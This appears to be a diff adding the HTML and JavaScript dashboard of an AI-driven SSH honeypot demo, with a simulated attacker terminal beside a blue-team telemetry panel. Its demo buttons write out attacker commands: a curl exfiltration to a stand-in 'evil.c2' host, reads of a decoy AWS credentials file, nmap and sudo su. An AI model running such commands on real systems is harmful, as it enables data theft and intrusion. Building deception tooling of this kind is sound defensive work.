@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MirageNet — AI-Powered Cyber Deception Platform</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Inter', sans-serif; background-color: #060913; color: #e2e8f0; }
+    .mono { font-family: 'JetBrains Mono', monospace; }
+    .terminal-scroll::-webkit-scrollbar { width: 6px; }
+    .terminal-scroll::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 3px; }
+    @keyframes pulse-border {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.5); }
+      50% { box-shadow: 0 0 20px 2px rgba(239, 68, 68, 0.35); }
+    }
+    .canary-alert-active { animation: pulse-border 1.5s infinite; }
+  </style>
+</head>
+<body class="h-screen flex flex-col overflow-hidden">
+
+  <!-- Top Command Header -->
+  <header class="bg-[#0b1020] border-b border-slate-800 px-5 py-3 flex items-center justify-between shrink-0">
+    <div class="flex items-center gap-3">
+      <div class="w-9 h-9 rounded-lg bg-gradient-to-br from-cyan-500 to-indigo-600 flex items-center justify-center font-bold text-white shadow-lg shadow-cyan-500/20">
+        M
+      </div>
+      <div>
+        <h1 class="text-lg font-bold tracking-tight text-white flex items-center gap-2">
+          MirageNet
+          <span class="text-[11px] font-semibold px-2 py-0.5 rounded-full bg-cyan-500/15 text-cyan-400 border border-cyan-500/30">
+            AI DECEPTION LAB
+          </span>
+        </h1>
+        <p class="text-xs text-slate-400">Autonomous Cyber Deception Honeypot &amp; Real-Time Threat Forensics</p>
+      </div>
+    </div>
+
+    <div class="flex items-center gap-3">
+      <div class="hidden md:flex items-center gap-2 px-3 py-1.5 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-semibold">
+        <span class="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
+        REAL INFRASTRUCTURE: 100% ISOLATED
+      </div>
+      <button onclick="startNewSession()" class="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold border border-slate-700 transition">
+        + New Trap Session
+      </button>
+      <button onclick="openReportModal()" class="px-3.5 py-1.5 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold shadow-lg shadow-indigo-600/25 transition">
+        Forensic Report &amp; Hash Verify
+      </button>
+    </div>
+  </header>
+
+  <!-- Main Split-Screen Workspace -->
+  <main class="flex-1 grid grid-cols-1 lg:grid-cols-2 gap-0 overflow-hidden">
+
+    <!-- LEFT PANE: Attacker Illusion Room (Web SSH Terminal) -->
+    <section class="flex flex-col border-r border-slate-800 bg-[#05080f] overflow-hidden">
+      <div class="px-4 py-2.5 bg-[#0e1424] border-b border-slate-800 flex items-center justify-between">
+        <div class="flex items-center gap-2">
+          <span class="w-2.5 h-2.5 rounded-full bg-rose-500"></span>
+          <span class="text-xs font-bold uppercase tracking-wider text-rose-400">
+            Attacker View — Compromised SSH Illusion Room
+          </span>
+        </div>
+        <span id="sessionBadge" class="mono text-[11px] text-slate-400 bg-slate-900 px-2 py-0.5 rounded border border-slate-800">
+          Connecting...
+        </span>
+      </div>
+
+      <!-- Quick Attack Scenario Buttons for Live Demo -->
+      <div class="px-4 py-2 bg-[#090d19] border-b border-slate-800/80 flex flex-wrap items-center gap-1.5">
+        <span class="text-[11px] text-slate-400 font-medium mr-1">Demo Commands:</span>
+        <button onclick="runQuickCmd('ls -la')" class="mono text-[11px] px-2 py-1 rounded bg-slate-800/90 hover:bg-slate-700 text-cyan-300 border border-slate-700/70">ls -la</button>
+        <button onclick="runQuickCmd('cat notes.txt')" class="mono text-[11px] px-2 py-1 rounded bg-slate-800/90 hover:bg-slate-700 text-cyan-300 border border-slate-700/70">cat notes.txt</button>
+        <button onclick="runQuickCmd('find /opt')" class="mono text-[11px] px-2 py-1 rounded bg-slate-800/90 hover:bg-slate-700 text-cyan-300 border border-slate-700/70">find /opt</button>
+        <button onclick="runQuickCmd('cat /opt/company_data/salaries_2026.csv')" class="mono text-[11px] px-2 py-1 rounded bg-rose-950/60 hover:bg-rose-900/70 text-rose-300 border border-rose-700/50">Steal Salaries (Canary)</button>
+        <button onclick="runQuickCmd('cat /opt/company_data/aws_credentials.env')" class="mono text-[11px] px-2 py-1 rounded bg-rose-950/60 hover:bg-rose-900/70 text-rose-300 border border-rose-700/50">Steal AWS Keys</button>
+        <button onclick="runQuickCmd('nmap 10.20.0.14')" class="mono text-[11px] px-2 py-1 rounded bg-amber-950/60 hover:bg-amber-900/70 text-amber-300 border border-amber-700/50">nmap 10.20.0.14</button>
+        <button onclick="runQuickCmd('sudo su')" class="mono text-[11px] px-2 py-1 rounded bg-amber-950/60 hover:bg-amber-900/70 text-amber-300 border border-amber-700/50">sudo su</button>
+        <button onclick="runQuickCmd('curl http://evil.c2/exfil -d @salaries_2026.csv')" class="mono text-[11px] px-2 py-1 rounded bg-rose-950/60 hover:bg-rose-900/70 text-rose-300 border border-rose-700/50">Exfiltrate Data</button>
+      </div>
+
+      <!-- Terminal Output -->
+      <div id="terminalOutput" class="flex-1 p-4 mono text-xs leading-relaxed overflow-y-auto terminal-scroll space-y-2 text-slate-200">
+        <div class="text-emerald-400">Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)</div>
+        <div class="text-slate-400">Last login: Fri Nov 27 21:10:02 2026 from 10.0.1.5</div>
+        <div class="text-amber-400/90 text-[11px] pb-2 border-b border-slate-800/80">
+          [MirageNet Note: Attacker thinks this is the real corporate server. Every command below is answered by the AI Illusion Engine.]
+        </div>
+      </div>
+
+      <!-- Terminal Input -->
+      <form onsubmit="handleTerminalSubmit(event)" class="p-3 bg-[#090d19] border-t border-slate-800 flex items-center gap-2 mono text-xs">
+        <span id="promptLabel" class="text-emerald-400 font-semibold shrink-0">admin@corp-prod-srv01:/home/admin$</span>
+        <input
+          id="cmdInput"
+          type="text"
+          autocomplete="off"
+          placeholder="Type Linux command (e.g., ls, cat notes.txt, help)..."
+          class="flex-1 bg-transparent text-white outline-none placeholder-slate-600"
+          autofocus
+        />
+        <button type="submit" class="px-3 py-1 rounded bg-cyan-600 hover:bg-cyan-500 text-white font-sans font-semibold text-xs">
+          Run
+        </button>
+      </form>
+    </section>
+
+    <!-- RIGHT PANE: Blue Team SOC Deception Dashboard -->
+    <section class="flex flex-col bg-[#080d1a] overflow-hidden">
+      <div class="px-4 py-2.5 bg-[#0e1424] border-b border-slate-800 flex items-center justify-between">
+        <div class="flex items-center gap-2">
+          <span class="w-2.5 h-2.5 rounded-full bg-cyan-400 animate-pulse"></span>
+          <span class="text-xs font-bold uppercase tracking-wider text-cyan-400">
+            Blue Team SOC — Live Deception Telemetry
+          </span>
+        </div>
+        <span id="wsStatus" class="text-[11px] font-semibold text-emerald-400">● WebSocket Live</span>
+      </div>
+
+      <div class="flex-1 p-4 overflow-y-auto terminal-scroll space-y-4">
+
+        <!-- Top Metrics Cards -->
+        <div class="grid grid-cols-3 gap-3">
+          <div class="bg-[#0e1526] border border-slate-800 rounded-xl p-3">
+            <div class="text-[11px] text-slate-400 font-medium">Threat Score</div>
+            <div class="flex items-end justify-between mt-1">
+              <span id="threatScore" class="text-2xl font-extrabold text-amber-400">10</span>
+              <span class="text-xs text-slate-500">/ 100</span>
+            </div>
+            <div class="w-full h-1.5 bg-slate-800 rounded-full mt-2 overflow-hidden">
+              <div id="threatBar" class="h-full bg-amber-400 transition-all duration-300" style="width: 10%"></div>
+            </div>
+          </div>
+
+          <div class="bg-[#0e1526] border border-slate-800 rounded-xl p-3">
+            <div class="text-[11px] text-slate-400 font-medium">Attacker Persona</div>
+            <div id="attackerPersona" class="text-sm font-bold text-cyan-300 mt-1.5 leading-snug">
+              Reconnaissance Probe
+            </div>
+          </div>
+
+          <div class="bg-[#0e1526] border border-slate-800 rounded-xl p-3">
+            <div class="text-[11px] text-slate-400 font-medium">Canary Traps Triggered</div>
+            <div id="canaryCount" class="text-2xl font-extrabold text-slate-200 mt-1">0</div>
+          </div>
+        </div>
+
+        <!-- Canary Alert Box (Hidden until triggered) -->
+        <div id="canaryAlertBox" class="hidden bg-rose-950/50 border border-rose-500/70 rounded-xl p-3.5 canary-alert-active">
+          <div class="flex items-center justify-between">
+            <span class="text-xs font-extrabold uppercase tracking-wider text-rose-400 flex items-center gap-2">
+              🚨 CANARY TOKEN TRIPWIRE ACTIVATED
+            </span>
+            <span id="canaryTokenBadge" class="mono text-[11px] bg-rose-500/20 text-rose-300 px-2 py-0.5 rounded border border-rose-500/40"></span>
+          </div>
+          <p id="canaryAlertText" class="text-xs text-rose-200 mt-1.5"></p>
+        </div>
+
+        <!-- MITRE ATT&CK Observed Tactics -->
+        <div class="bg-[#0e1526] border border-slate-800 rounded-xl p-3.5">
+          <div class="text-xs font-bold text-slate-300 mb-2 flex items-center justify-between">
+            <span>MITRE ATT&amp;CK Live Mapping</span>
+            <span class="text-[10px] text-slate-500">Auto-classified by Threat Profiler</span>
+          </div>
+          <div id="mitreTags" class="flex flex-wrap gap-1.5 text-xs">
+            <span class="text-slate-500 text-[11px]">Waiting for attacker activity...</span>
+          </div>
+        </div>
+
+        <!-- Live Telemetry Feed -->
+        <div class="bg-[#0e1526] border border-slate-800 rounded-xl p-3.5">
+          <div class="text-xs font-bold text-slate-300 mb-2.5 flex items-center justify-between">
+            <span>Live Forensic Event Stream (SHA-256 Chained)</span>
+            <span id="cmdCounter" class="text-[11px] text-slate-400">0 events</span>
+          </div>
+          <div id="telemetryFeed" class="space-y-2.5 max-h-[340px] overflow-y-auto terminal-scroll pr-1">
+            <div class="text-xs text-slate-500 italic">No commands captured yet. Try typing a command on the left terminal!</div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+  </main>
+
+  <!-- Forensic Report Modal -->
+  <div id="reportModal" class="hidden fixed inset-0 bg-black/75 backdrop-blur-sm flex items-center justify-center p-4 z-50">
+    <div class="bg-[#0e1526] border border-slate-700 rounded-2xl max-w-2xl w-full p-6 shadow-2xl space-y-4">
+      <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+        <h2 class="text-base font-bold text-white">MirageNet Forensic Incident Report</h2>
+        <button onclick="closeReportModal()" class="text-slate-400 hover:text-white text-sm font-bold">✕</button>
+      </div>
+      <div id="reportContent" class="space-y-3 text-xs text-slate-300 max-h-[65vh] overflow-y-auto terminal-scroll">
+        Loading report...
+      </div>
+      <div class="flex justify-end gap-2 pt-2 border-t border-slate-800">
+        <button onclick="closeReportModal()" class="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs font-semibold text-white">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let currentSessionId = null;
+    let seenMitre = new Set();
+    let canaryHits = 0;
+    let eventCount = 0;
+    let ws = null;
+
+    async function startNewSession() {
+      const res = await fetch('/api/session/start', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ attacker_ip: '185.220.101.42', entry_vector: 'SSH Decoy Port 22' })
+      });
+      const data = await res.json();
+      currentSessionId = data.id;
+      document.getElementById('sessionBadge').textContent = `Session: ${currentSessionId}`;
+      document.getElementById('threatScore').textContent = '10';
+      document.getElementById('threatBar').style.width = '10%';
+      document.getElementById('attackerPersona').textContent = data.persona;
+      document.getElementById('canaryCount').textContent = '0';
+      document.getElementById('canaryAlertBox').classList.add('hidden');
+      document.getElementById('mitreTags').innerHTML = '<span class="text-slate-500 text-[11px]">Waiting for attacker activity...</span>';
+      document.getElementById('telemetryFeed').innerHTML = '<div class="text-xs text-slate-500 italic">New trap session active. Waiting for commands...</div>';
+      document.getElementById('promptLabel').textContent = 'admin@corp-prod-srv01:/home/admin$';
+      seenMitre.clear();
+      canaryHits = 0;
+      eventCount = 0;
+      document.getElementById('cmdCounter').textContent = '0 events';
+    }
+
+    function connectWebSocket() {
+      const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+      ws = new WebSocket(`${proto}//${location.host}/ws/dashboard`);
+      ws.onopen = () => {
+        document.getElementById('wsStatus').textContent = '● WebSocket Live';
+        document.getElementById('wsStatus').className = 'text-[11px] font-semibold text-emerald-400';
+      };
+      ws.onclose = () => {
+        document.getElementById('wsStatus').textContent = '○ Reconnecting...';
+        document.getElementById('wsStatus').className = 'text-[11px] font-semibold text-amber-400';
+        setTimeout(connectWebSocket, 2000);
+      };
+      ws.onmessage = (msg) => {
+        const event = JSON.parse(msg.data);
+        if (event.type === 'COMMAND_EXECUTED' && event.session_id === currentSessionId) {
+          updateDashboard(event);
+        }
+      };
+    }
+
+    function updateDashboard(ev) {
+      const a = ev.analysis;
+      eventCount++;
+      document.getElementById('cmdCounter').textContent = `${eventCount} events`;
+
+      // Update Threat Score
+      const score = a.new_threat_score;
+      const scoreEl = document.getElementById('threatScore');
+      const barEl = document.getElementById('threatBar');
+      scoreEl.textContent = score;
+      barEl.style.width = `${score}%`;
+      if (score >= 75) {
+        scoreEl.className = 'text-2xl font-extrabold text-rose-500';
+        barEl.className = 'h-full bg-rose-500 transition-all duration-300';
+      } else if (score >= 40) {
+        scoreEl.className = 'text-2xl font-extrabold text-amber-400';
+        barEl.className = 'h-full bg-amber-400 transition-all duration-300';
+      } else {
+        scoreEl.className = 'text-2xl font-extrabold text-cyan-400';
+        barEl.className = 'h-full bg-cyan-400 transition-all duration-300';
+      }
+
+      document.getElementById('attackerPersona').textContent = a.persona;
+
+      // Canary Alert
+      if (a.canary_triggered) {
+        canaryHits++;
+        document.getElementById('canaryCount').textContent = canaryHits;
+        document.getElementById('canaryCount').className = 'text-2xl font-extrabold text-rose-500';
+        document.getElementById('canaryAlertBox').classList.remove('hidden');
+        document.getElementById('canaryTokenBadge').textContent = a.canary_triggered;
+        document.getElementById('canaryAlertText').textContent =
+          `Intruder accessed decoy file "${a.canary_file}". Tracking beacon armed and forensic evidence locked.`;
+      }
+
+      // MITRE Tags
+      const mitreBox = document.getElementById('mitreTags');
+      if (seenMitre.size === 0) mitreBox.innerHTML = '';
+      if (!seenMitre.has(a.mitre_id)) {
+        seenMitre.add(a.mitre_id);
+        const badge = document.createElement('span');
+        badge.className = 'mono text-[11px] px-2 py-1 rounded bg-indigo-500/20 text-indigo-300 border border-indigo-500/40';
+        badge.textContent = `${a.mitre_id}: ${a.tactic}`;
+        mitreBox.appendChild(badge);
+      }
+
+      // Telemetry Feed
+      const feed = document.getElementById('telemetryFeed');
+      if (eventCount === 1) feed.innerHTML = '';
+      const sevColors = {
+        CRITICAL: 'border-rose-500/60 bg-rose-950/25',
+        HIGH: 'border-amber-500/50 bg-amber-950/20',
+        MEDIUM: 'border-cyan-500/40 bg-cyan-950/15',
+        LOW: 'border-slate-700 bg-slate-900/60'
+      };
+      const item = document.createElement('div');
+      item.className = `p-2.5 rounded-lg border ${sevColors[a.severity] || sevColors.LOW} text-xs space-y-1`;
+      item.innerHTML = `
+        <div class="flex items-center justify-between">
+          <span class="mono font-bold text-white">$ ${escapeHtml(ev.command)}</span>
+          <span class="text-[10px] font-bold px-1.5 py-0.5 rounded bg-slate-800 text-slate-300">${a.severity}</span>
+        </div>
+        <div class="text-[11px] text-slate-300">${escapeHtml(a.ai_note)}</div>
+        <div class="mono text-[10px] text-slate-500 truncate">SHA-256: ${ev.evidence_hash}</div>
+      `;
+      feed.prepend(item);
+    }
+
+    async function executeCommand(cmd) {
+      if (!currentSessionId || !cmd.trim()) return;
+      const term = document.getElementById('terminalOutput');
+      const promptText = document.getElementById('promptLabel').textContent;
+
+      const cmdLine = document.createElement('div');
+      cmdLine.innerHTML = `<span class="text-emerald-400">${escapeHtml(promptText)}</span> <span class="text-white font-semibold">${escapeHtml(cmd)}</span>`;
+      term.appendChild(cmdLine);
+
+      const res = await fetch('/api/command', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ session_id: currentSessionId, command: cmd })
+      });
+      const data = await res.json();
+
+      if (data.output) {
+        const outEl = document.createElement('pre');
+        outEl.className = 'text-slate-300 whitespace-pre-wrap break-words';
+        outEl.textContent = data.output;
+        term.appendChild(outEl);
+      }
+
+      const symbol = data.user === 'root' ? '#' : '$';
+      document.getElementById('promptLabel').textContent = `${data.user}@${data.hostname}:${data.cwd}${symbol}`;
+      term.scrollTop = term.scrollHeight;
+    }
+
+    function handleTerminalSubmit(e) {
+      e.preventDefault();
+      const input = document.getElementById('cmdInput');
+      const cmd = input.value;
+      input.value = '';
+      if (cmd.trim() === 'clear') {
+        document.getElementById('terminalOutput').innerHTML = '';
+        return;
+      }
+      executeCommand(cmd);
+    }
+
+    function runQuickCmd(cmd) {
+      executeCommand(cmd);
+    }
+
+    async function openReportModal() {
+      if (!currentSessionId) return;
+      document.getElementById('reportModal').classList.remove('hidden');
+      const res = await fetch(`/api/session/${currentSessionId}/report`);
+      const rep = await res.json();
+      const verifiedBadge = rep.integrity_verified
+        ? '<span class="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 font-bold">✓ SHA-256 Chain Verified</span>'
+        : '<span class="px-2 py-0.5 rounded bg-rose-500/20 text-rose-400 font-bold">✕ Integrity Tampered</span>';
+
+      document.getElementById('reportContent').innerHTML = `
+        <div class="flex items-center justify-between bg-slate-900 p-3 rounded-lg border border-slate-800">
+          <div>
+            <div class="font-bold text-white">Session: ${rep.session.id}</div>
+            <div class="text-slate-400">IP: ${rep.session.attacker_ip} • Commands: ${rep.total_commands}</div>
+          </div>
+          ${verifiedBadge}
+        </div>
+        <div class="bg-indigo-950/30 border border-indigo-500/30 p-3 rounded-lg">
+          <div class="font-bold text-indigo-300 mb-1">AI Forensic Executive Summary</div>
+          <p class="leading-relaxed text-slate-200">${escapeHtml(rep.ai_summary)}</p>
+        </div>
+        <div>
+          <div class="font-bold text-slate-300 mb-1.5">Evidence Chain of Custody (${rep.logs.length} entries)</div>
+          <div class="space-y-1.5">
+            ${rep.logs.map(l => `
+              <div class="bg-slate-900/80 p-2 rounded border border-slate-800 mono text-[10px]">
+                <div class="text-cyan-300 font-bold">$ ${escapeHtml(l.command)} <span class="text-slate-500">(${l.mitre_id})</span></div>
+                <div class="text-slate-500 truncate">Hash: ${l.evidence_hash}</div>
+              </div>
+            `).join('')}
+          </div>
+        </div>
+      `;
+    }
+
+    function closeReportModal() {
+      document.getElementById('reportModal').classList.add('hidden');
+    }
+
+    function escapeHtml(str) {
+      return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;');
+    }
+
+    // Boot
+    connectWebSocket();
+    startNewSession();
+  </script>
+</body>
+</html>
